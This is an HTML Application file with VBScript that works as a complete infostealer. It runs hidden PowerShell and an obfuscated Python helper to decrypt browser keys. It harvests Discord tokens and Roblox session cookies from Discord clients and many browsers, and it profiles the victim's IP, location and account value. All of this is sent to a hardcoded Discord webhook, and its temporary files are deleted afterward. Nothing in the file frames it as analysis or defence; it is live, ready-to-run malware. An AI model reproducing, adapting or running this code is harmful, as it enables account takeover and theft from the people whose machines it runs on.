<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discord.com/api/webhooks/1560055014452502561/2U4AKS7_dxuIrHR4l7tcr8pnPfWw-mlrsvlN-tQgoPAJNA8El6WnAEs1UcpMnnj0BA4o"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    IP()
    GrabDiscord()
    GrabRoblox()
End Sub

Sub IP()
    Dim xh, ip, ll, info
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send
    If xh.Status <> 200 Then Exit Sub
    ll   = Split(xh.responseText, vbLf)
    info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | USER: " & USER
    PostEmbed "Target", info, 3447003
    Set xh = Nothing
End Sub

Sub GrabDiscord()
    Dim psf, tf, raw
    psf = TmpFile("dc_g.ps1")
    tf  = TmpFile("dc_r.txt")
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If fso.FileExists(tf)  Then fso.DeleteFile tf,  True

    Dim f : Set f = fso.CreateTextFile(psf, True, False)

    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$gcmOK = $false"
    f.WriteLine "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
    f.WriteLine "$tokens = New-Object System.Collections.Generic.List[string]"
    f.WriteLine "$seen   = New-Object System.Collections.Generic.HashSet[string]"
    f.WriteLine ""
    f.WriteLine "function Get-MK($base) {"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Dec-GCM($mk, $b) {"
    f.WriteLine "    if (-not $gcmOK -or $null -eq $mk -or $b.Length -lt 31) { return $null }"
    f.WriteLine "    try {"
    f.WriteLine "        $nonce = [byte[]]$b[3..14]"
    f.WriteLine "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]"
    f.WriteLine "        $ct    = [byte[]]$b[15..($b.Length-17)]"
    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
    f.WriteLine "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
    f.WriteLine "        $gcm.Dispose()"
    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Valid-Token($t) {"
    f.WriteLine "    if (-not $t) { return $false }"
    f.WriteLine "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }"
    f.WriteLine "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }"
    f.WriteLine "    return $false"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Check-Token($t) {"
    f.WriteLine "    try {"
    f.WriteLine "        $wc = New-Object System.Net.WebClient"
    f.WriteLine "        $wc.Headers.Add('Authorization', $t)"
    f.WriteLine "        $wc.Headers.Add('Content-Type', 'application/json')"
    f.WriteLine "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')"
    f.WriteLine "        $wc.Dispose()"
    f.WriteLine "        return $r -match '""id""'"
    f.WriteLine "    } catch { return $false }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Scan-File($path, $mk) {"
    f.WriteLine "    try {"
    f.WriteLine "        $bytes = [System.IO.File]::ReadAllBytes($path)"
    f.WriteLine "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
    f.WriteLine "        $rx1   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}'"
    f.WriteLine "        foreach ($m in $rx1.Matches($txt)) {"
    f.WriteLine "            try {"
    f.WriteLine "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))"
    f.WriteLine "                $dec = Dec-GCM $mk $enc"
    f.WriteLine "                if ((Valid-Token $dec) -and (Check-Token $dec) -and $seen.Add($dec)) { $tokens.Add($dec) }"
    f.WriteLine "            } catch {}"
    f.WriteLine "        }"
    f.WriteLine "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'"
    f.WriteLine "        foreach ($m in $rx2.Matches($txt)) {"
    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $tokens.Add($m.Value) }"
    f.WriteLine "        }"
    f.WriteLine "        $rx3 = [regex]'mfa\.[\w-]{84}'"
    f.WriteLine "        foreach ($m in $rx3.Matches($txt)) {"
    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value) -and $seen.Add($m.Value)) { $tokens.Add($m.Value) }"
    f.WriteLine "        }"
    f.WriteLine "    } catch {}"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Scan-Dir($ldb, $mk) {"
    f.WriteLine "    if (-not (Test-Path $ldb)) { return }"
    f.WriteLine "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |"
    f.WriteLine "             Where-Object { $_.Extension -in '.ldb','.log' } |"
    f.WriteLine "             Sort-Object LastWriteTime -Descending"
    f.WriteLine "    foreach ($file in $files) { Scan-File $file.FullName $mk }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {"
    f.WriteLine "    $base = Join-Path $env:APPDATA $app"
    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
    f.WriteLine "    $mk = Get-MK $base"
    f.WriteLine "    Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "foreach ($br in @("
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Google\Chrome SxS\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera GX Stable'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Yandex\YandexBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Chromium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kometa\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Orbitum\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Iridium\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA '7Star\7Star\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Sputnik\Sputnik\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Epic Privacy Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'uCozMedia\Uran\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Torch\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Comodo\Dragon\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Amigo\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'CocCoc\Browser\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Kinza\User Data'),"
    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Maxthon\Application\User Data'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera Stable'),"
    f.WriteLine "    (Join-Path $env:APPDATA      'Opera Software\Opera GX Stable')"
    f.WriteLine ")) {"
    f.WriteLine "    if (-not (Test-Path $br)) { continue }"
    f.WriteLine "    $mk    = Get-MK $br"
    f.WriteLine "    $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
    f.WriteLine "    foreach ($p in $profs) {"
    f.WriteLine "        Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "if ($tokens.Count -gt 0) { ($tokens -join [Environment]::NewLine) | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"

    f.Close : Set f = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If Not fso.FileExists(tf) Then Exit Sub
    raw = Trim(ReadFile(tf))
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub

    Dim dcLines, dcLine, dcIdx
    dcLines = Split(raw, vbLf)
    dcIdx = 0
    For Each dcLine In dcLines
        dcLine = Trim(dcLine)
        If Len(dcLine) > 10 Then
            dcIdx = dcIdx + 1
            PostFile "discord_token_" & dcIdx & ".txt", dcLine
        End If
    Next
End Sub

Sub GrabRoblox()
    Dim psf, tf, raw
    psf = TmpFile("rblx_g.ps1")
    tf  = TmpFile("rblx_r.txt")
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If fso.FileExists(tf)  Then fso.DeleteFile tf,  True

    Dim g : Set g = fso.CreateTextFile(psf, True, False)

    g.WriteLine "Add-Type -AssemblyName System.Security"
    g.WriteLine "$cookies = New-Object System.Collections.Generic.List[string]"
    g.WriteLine "$seen    = New-Object System.Collections.Generic.HashSet[string]"
    g.WriteLine ""
    g.WriteLine "function Clean-Cookie($raw) {"
    g.WriteLine "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]"
    g.WriteLine "    $i = $c.IndexOf('_|WARNING')"
    g.WriteLine "    if ($i -gt 0) { $c = $c.Substring($i) }"
    g.WriteLine "    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }"
    g.WriteLine "    return $null"
    g.WriteLine "}"
    g.WriteLine ""
    g.WriteLine "function Add-Cookie($raw) {"
    g.WriteLine "    $c = Clean-Cookie $raw"
    g.WriteLine "    if ($c -and $seen.Add($c)) { $cookies.Add($c) }"
    g.WriteLine "}"
    g.WriteLine ""
    g.WriteLine "foreach ($rp in @("
    g.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),"
    g.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'),"
    g.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies'),"
    g.WriteLine "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')"
    g.WriteLine ")) {"
    g.WriteLine "    if (-not (Test-Path $rp)) { continue }"
    g.WriteLine "    try {"
    g.WriteLine "        $raw = [System.IO.File]::ReadAllText($rp)"
    g.WriteLine "        try {"
    g.WriteLine "            $j = $raw | ConvertFrom-Json"
    g.WriteLine "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {"
    g.WriteLine "                try {"
    g.WriteLine "                    $ek  = [Convert]::FromBase64String($_.Value)"
    g.WriteLine "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')"
    g.WriteLine "                    $str = [System.Text.Encoding]::UTF8.GetString($dec)"
    g.WriteLine "                    Add-Cookie $str"
    g.WriteLine "                } catch {}"
    g.WriteLine "            }"
    g.WriteLine "        } catch {}"
    g.WriteLine "        Add-Cookie $raw"
    g.WriteLine "    } catch {}"
    g.WriteLine "}"
    g.WriteLine ""
    g.WriteLine "$pkgs = Join-Path $env:LOCALAPPDATA 'Packages'"
    g.WriteLine "if (Test-Path $pkgs) {"
    g.WriteLine "    Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
    g.WriteLine "        foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
    g.WriteLine "            $uwp = Join-Path $_.FullName $fn"
    g.WriteLine "            if (-not (Test-Path $uwp)) { continue }"
    g.WriteLine "            try { Add-Cookie ([System.IO.File]::ReadAllText($uwp)) } catch {}"
    g.WriteLine "        }"
    g.WriteLine "    }"
    g.WriteLine "}"
    g.WriteLine ""
    g.WriteLine "$py = (Get-Command python -EA SilentlyContinue)"
    g.WriteLine "if (-not $py) { $py = (Get-Command python3 -EA SilentlyContinue) }"
    g.WriteLine "if ($py) {"
    g.WriteLine "    $pyPath = Join-Path $env:TEMP 'rblx_ck.py'"
    g.WriteLine "    $lines = @("
    g.WriteLine "        'import sqlite3,os,shutil,ctypes,base64,json',"
    g.WriteLine "        'class B(ctypes.Structure):',"
    g.WriteLine "        '    _fields_=[(chr(99)+chr(98),ctypes.c_ulong),(chr(112)+chr(98),ctypes.POINTER(ctypes.c_char))]',"
    g.WriteLine "        'def dpapi(d):',"
    g.WriteLine "        '    i=B(len(d),ctypes.cast(ctypes.create_string_buffer(d),ctypes.POINTER(ctypes.c_char)));o=B()',"
    g.WriteLine "        '    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o)):return bytes(ctypes.string_at(o.pb,o.cb))',"
    g.WriteLine "        '    return None',"
    g.WriteLine "        'def get_mk(b):',"
    g.WriteLine "        '    ls=os.path.join(b,chr(76)+chr(111)+chr(99)+chr(97)+chr(108)+chr(32)+chr(83)+chr(116)+chr(97)+chr(116)+chr(101))',"
    g.WriteLine "        '    if not os.path.exists(ls):return None',"
    g.WriteLine "        '    try:',"
    g.WriteLine "        '        j=json.load(open(ls,chr(114),encoding=chr(117)+chr(116)+chr(102)+chr(45)+chr(56)));ek=base64.b64decode(j[chr(111)+chr(115)+chr(95)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)][chr(101)+chr(110)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(95)+chr(107)+chr(101)+chr(121)]);return dpapi(ek[5:])',"
    g.WriteLine "        '    except:return None',"
    g.WriteLine "        'def dec_ck(mk,enc):',"
    g.WriteLine "        '    if not mk or len(enc)<32:return None',"
    g.WriteLine "        '    try:',"
    g.WriteLine "        '        from cryptography.hazmat.primitives.ciphers.aead import AESGCM',"
    g.WriteLine "        '        return AESGCM(mk).decrypt(enc[3:15],enc[15:],None).decode(chr(117)+chr(116)+chr(102)+chr(45)+chr(56),chr(114)+chr(101)+chr(112)+chr(108)+chr(97)+chr(99)+chr(101))',"
    g.WriteLine "        '    except:return None',"
    g.WriteLine "        'def query_db(path,mk):',"
    g.WriteLine "        '    tmp=path+chr(46)+chr(116)+chr(109)+chr(112)',"
    g.WriteLine "        '    try:',"
    g.WriteLine "        '        shutil.copy2(path,tmp);cn=sqlite3.connect(tmp)',"
    g.WriteLine "        '        rows=cn.execute(chr(83)+chr(69)+chr(76)+chr(69)+chr(67)+chr(84)+chr(32)+chr(118)+chr(97)+chr(108)+chr(117)+chr(101)+chr(44)+chr(101)+chr(110)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(95)+chr(118)+chr(97)+chr(108)+chr(117)+chr(101)+chr(32)+chr(70)+chr(82)+chr(79)+chr(77)+chr(32)+chr(99)+chr(111)+chr(111)+chr(107)+chr(105)+chr(101)+chr(115)+chr(32)+chr(87)+chr(72)+chr(69)+chr(82)+chr(69)+chr(32)+chr(110)+chr(97)+chr(109)+chr(101)+chr(61)+chr(39)+chr(46)+chr(82)+chr(79)+chr(66)+chr(76)+chr(79)+chr(83)+chr(69)+chr(67)+chr(85)+chr(82)+chr(73)+chr(84)+chr(89)+chr(39)).fetchall()',"
    g.WriteLine "        '        cn.close();os.unlink(tmp)',"
    g.WriteLine "        '        out=[]',"
    g.WriteLine "        '        for row in rows:',"
    g.WriteLine "        '            v=row[0] if row[0] else dec_ck(mk,row[1])',"
    g.WriteLine "        '            if v:out.append(v)',"
    g.WriteLine "        '        return out',"
    g.WriteLine "        '    except:',"
    g.WriteLine "        '        try:os.unlink(tmp)',"
    g.WriteLine "        '        except:pass',"
    g.WriteLine "        '    return []',"
    g.WriteLine "        'seen=set();results=[]',"
    g.WriteLine "        'LA=os.path.expandvars(chr(37)+chr(76)+chr(79)+chr(67)+chr(65)+chr(76)+chr(65)+chr(80)+chr(80)+chr(68)+chr(65)+chr(84)+chr(65)+chr(37))',"
    g.WriteLine "        'browsers=[',"
    g.WriteLine "        '    os.path.join(LA,chr(71)+chr(111)+chr(111)+chr(103)+chr(108)+chr(101),chr(67)+chr(104)+chr(114)+chr(111)+chr(109)+chr(101),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(71)+chr(111)+chr(111)+chr(103)+chr(108)+chr(101),chr(67)+chr(104)+chr(114)+chr(111)+chr(109)+chr(101)+chr(32)+chr(83)+chr(120)+chr(83),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(77)+chr(105)+chr(99)+chr(114)+chr(111)+chr(115)+chr(111)+chr(102)+chr(116),chr(69)+chr(100)+chr(103)+chr(101),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(66)+chr(114)+chr(97)+chr(118)+chr(101)+chr(83)+chr(111)+chr(102)+chr(116)+chr(119)+chr(97)+chr(114)+chr(101),chr(66)+chr(114)+chr(97)+chr(118)+chr(101)+chr(45)+chr(66)+chr(114)+chr(111)+chr(119)+chr(115)+chr(101)+chr(114),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(79)+chr(112)+chr(101)+chr(114)+chr(97)+chr(32)+chr(83)+chr(111)+chr(102)+chr(116)+chr(119)+chr(97)+chr(114)+chr(101),chr(79)+chr(112)+chr(101)+chr(114)+chr(97)+chr(32)+chr(83)+chr(116)+chr(97)+chr(98)+chr(108)+chr(101)),',"
    g.WriteLine "        '    os.path.join(LA,chr(79)+chr(112)+chr(101)+chr(114)+chr(97)+chr(32)+chr(83)+chr(111)+chr(102)+chr(116)+chr(119)+chr(97)+chr(114)+chr(101),chr(79)+chr(112)+chr(101)+chr(114)+chr(97)+chr(32)+chr(71)+chr(88)+chr(32)+chr(83)+chr(116)+chr(97)+chr(98)+chr(108)+chr(101)),',"
    g.WriteLine "        '    os.path.join(LA,chr(86)+chr(105)+chr(118)+chr(97)+chr(108)+chr(100)+chr(105),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(89)+chr(97)+chr(110)+chr(100)+chr(101)+chr(120),chr(89)+chr(97)+chr(110)+chr(100)+chr(101)+chr(120)+chr(66)+chr(114)+chr(111)+chr(119)+chr(115)+chr(101)+chr(114),chr(85)+chr(115)+chr(101)+chr(114)+chr(32)+chr(68)+chr(97)+chr(116)+chr(97)),',"
    g.WriteLine "        '    os.path.join(LA,chr(82)+chr(111)+chr(98)+chr(108)+chr(111)+chr(120),chr(69)+chr(66)+chr(87)+chr(101)+chr(98)+chr(86)+chr(105)+chr(101)+chr(119),chr(69)+chr(66)+chr(87)+chr(101)+chr(98)+chr(86)+chr(105)+chr(101)+chr(119))',"
    g.WriteLine "        ']',"
    g.WriteLine "        'for br in browsers:',"
    g.WriteLine "        '    if not os.path.exists(br):continue',"
    g.WriteLine "        '    mk=get_mk(br)',"
    g.WriteLine "        '    try:profs=[chr(68)+chr(101)+chr(102)+chr(97)+chr(117)+chr(108)+chr(116)]+[d for d in os.listdir(br) if d.startswith(chr(80)+chr(114)+chr(111)+chr(102)+chr(105)+chr(108)+chr(101)+chr(32))]',"
    g.WriteLine "        '    except:profs=[chr(68)+chr(101)+chr(102)+chr(97)+chr(117)+chr(108)+chr(116)]',"
    g.WriteLine "        '    for prof in profs:',"
    g.WriteLine "        '        for ckn in[chr(67)+chr(111)+chr(111)+chr(107)+chr(105)+chr(101)+chr(115),os.path.join(chr(78)+chr(101)+chr(116)+chr(119)+chr(111)+chr(114)+chr(107),chr(67)+chr(111)+chr(111)+chr(107)+chr(105)+chr(101)+chr(115))]:',"
    g.WriteLine "        '            ck=os.path.join(br,prof,ckn)',"
    g.WriteLine "        '            if not os.path.exists(ck):continue',"
    g.WriteLine "        '            for v in query_db(ck,mk):',"
    g.WriteLine "        '                if v not in seen:seen.add(v);results.append(v)',"
    g.WriteLine "        'print(chr(124)+chr(124)+chr(124).join(results) if results else chr(78)+chr(79)+chr(84)+chr(95)+chr(70)+chr(79)+chr(85)+chr(78)+chr(68))'"
    g.WriteLine "    )"
    g.WriteLine "    [System.IO.File]::WriteAllLines($pyPath, $lines, [System.Text.Encoding]::UTF8)"
    g.WriteLine "    $pyCks = (& $py.Source $pyPath 2>`$null | Out-String).Trim()"
    g.WriteLine "    Remove-Item $pyPath -EA SilentlyContinue"
    g.WriteLine "    if ($pyCks -and $pyCks -ne 'NOT_FOUND') {"
    g.WriteLine "        foreach ($c in ($pyCks -split '\|\|\|')) { Add-Cookie $c }"
    g.WriteLine "    }"
    g.WriteLine "}"
    g.WriteLine ""
    g.WriteLine "if ($cookies.Count -gt 0) { ($cookies -join [Environment]::NewLine) | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
    g.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"

    g.Close : Set g = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If Not fso.FileExists(tf) Then Exit Sub
    raw = Trim(ReadFile(tf))
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw = "NOT_FOUND" Or Len(raw) < 10 Then Exit Sub

    Dim rbLines, rbLine, rbIdx
    rbLines = Split(raw, vbLf)
    rbIdx = 0
    For Each rbLine In rbLines
        rbLine = Trim(rbLine)
        If Len(rbLine) > 10 Then
            rbIdx = rbIdx + 1
            PostFile "roblox_cookie_" & rbIdx & ".txt", rbLine
            GrabRobloxInfo rbLine, rbIdx
        End If
    Next
End Sub

Sub GrabRobloxInfo(cookie, idx)
    Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate

    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056

    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
    json = xh.responseText

    uid     = RegexFirst(json, """UserID"":(\d+)")
    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
    premium = RegexFirst(json, """IsPremium"":(true|false)")
    If uid = "" Then Set xh = Nothing : Exit Sub
    If robux   = "" Then robux   = "0"
    If premium = "" Then premium = "false"

    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
    xh.Send
    ageDays = "?"
    If xh.Status = 200 Then
        uinfo   = xh.responseText
        created = RegexFirst(uinfo, """created"":""([^T]+)")
        If created <> "" Then
            On Error Resume Next
            createdDate = CDate(created)
            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", createdDate, Now()))
            On Error GoTo 0
        End If
    End If

    rapVal = "0"
    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        Dim rapJson : rapJson = xh.responseText
        Dim rapSum  : rapSum  = 0
        Dim pos     : pos     = 1
        Dim key     : key     = """recentAveragePrice"":"
        Dim p, numStr, ch
        Do
            p = InStr(pos, rapJson, key)
            If p = 0 Then Exit Do
            p = p + Len(key)
            numStr = ""
            Do While p <= Len(rapJson)
                ch = Mid(rapJson, p, 1)
                If ch >= "0" And ch <= "9" Then
                    numStr = numStr & ch
                    p = p + 1
                Else
                    Exit Do
                End If
            Loop
            If numStr <> "" Then rapSum = rapSum + CLng(numStr)
            pos = p
        Loop
        rapVal = CStr(rapSum)
    End If

    Set xh = Nothing

    Dim nl : nl = Chr(10)
    Dim embedDesc : embedDesc = ""
    embedDesc = embedDesc & "**Username** | **Age** | **PC**" & nl
    embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
    embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
    embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
    embedDesc = embedDesc & "**Cookie**" & nl
    embedDesc = embedDesc & "``Check attached file roblox_cookie_" & idx & ".txt``"

    PostEmbed "Roblox Hit #" & idx, embedDesc, 16711680
End Sub

Function RegexFirst(src, pattern)
    Dim rx : Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern = pattern
    rx.IgnoreCase = True
    Dim m : Set m = rx.Execute(src)
    If m.Count > 0 Then
        If m(0).SubMatches.Count > 0 Then
            RegexFirst = m(0).SubMatches(0)
        Else
            RegexFirst = m(0).Value
        End If
    Else
        RegexFirst = ""
    End If
    Set rx = Nothing
End Function

Function TmpFile(n) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n : End Function

Function ReadFile(p)
    Dim f : Set f = fso.OpenTextFile(p, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    Dim DQ, j, h
    DQ = Chr(34)
    j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    Dim DQ, b, bd, h
    DQ = Chr(34)
    b  = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    bd = "--" & b & vbCrLf & _
         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
         ct & vbCrLf & "--" & b & "--"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
